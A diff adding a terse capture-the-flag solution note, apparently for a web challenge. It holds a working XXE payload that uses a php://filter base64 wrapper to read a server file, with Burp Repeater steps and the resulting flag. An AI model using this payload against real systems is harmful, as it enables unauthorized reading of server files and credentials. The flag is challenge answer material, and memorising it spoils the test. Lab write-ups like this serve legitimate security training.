@@ -1,0 +1,16 @@
+in burp open parse in brower and send to repeater
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+"php://filter/convert.base64-encode/resource=/var/www/html/flag">
+
+]>
+<foo>
+&xxe;
+</foo>  
+
+decode base64 output
+this should be it
+ctf{02bd486273026362e8a6961cd3303812073c50fa759b420b1e7a11a2c3ab0130}
